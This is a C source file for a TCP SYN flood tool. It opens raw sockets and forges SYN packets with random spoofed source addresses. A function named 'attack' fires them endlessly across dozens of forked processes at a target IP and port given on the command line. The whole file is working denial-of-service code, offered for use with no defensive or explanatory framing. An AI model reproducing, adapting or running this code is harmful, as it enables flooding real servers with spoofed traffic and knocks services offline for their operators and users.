#include "protocol.h"

int make_socket()
{
    int sock;
    int on =1;
    if((sock = socket(PF_INET, SOCK_RAW, IPPROTO_TCP)) < 0)  
    {
        perror("socket ");
        return 1;
    }
    if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0)
    {
        perror("setsockopt ");
        return -1;
    }
    return sock;
}

void make_packet(struct tcp_packet *packet, struct sockaddr_in *addr)
{
    struct in_addr ranip;
    uint16_t ranport = rand();
    uint32_t ranseq = rand();

    ranip.s_addr = rand();

    make_tcp_header_v2(&packet->tcphdr, ranip, ranport, addr->sin_addr, ntohs(addr->sin_port), ranseq, 0, TH_SYN);
    make_ip_header_v2(&packet->iphdr, ranip, addr->sin_addr, sizeof(struct tcphdr));
}

#define CONNECTIONS 8
#define THREADS 48

void attack(struct sockaddr_in *t_addr, int id)
{
	int sockets[CONNECTIONS];
	int n, g=1, len;
    struct tcp_packet packet;

    memset(&packet, 0 ,sizeof(struct tcp_packet));

	for(n=0; n!= CONNECTIONS; n++)
		sockets[n]=0;
	while(1) 
    {
		for(n=0; n != CONNECTIONS; n++)
        {
			if(sockets[n] == 0)
			    sockets[n] = make_socket();

            make_packet(&packet, t_addr);
            len=sendto(sockets[n], &packet, sizeof(packet), 0, (struct sockaddr *)t_addr, sizeof(*t_addr));
			if(len < 0)
            {
                perror("sendto");
                close(sockets[n]);
				sockets[n] = make_socket();
            }
            else
			    printf("Socket[%i->%i] -> %i\n", n, sockets[n], len);
			printf("[%i: Voly Sent]\n", id);
		}
		printf("[%i: Voly Sent]\n", id);
		usleep(300000);
	}
}

int main(int argc, char **argv) {
    int n;
    struct sockaddr_in t_addr;

    memset(&t_addr, 0 , sizeof(struct sockaddr_in));
    t_addr.sin_addr.s_addr = inet_addr(argv[1]);
    t_addr.sin_port = htons((uint16_t)atoi(argv[2]));
    t_addr.sin_family = AF_INET;
    
    for(n=0; n != THREADS; n++) {
		if(fork())
			attack(&t_addr, n);
		usleep(200000);
	}
	getc(stdin);
	return 0;
}
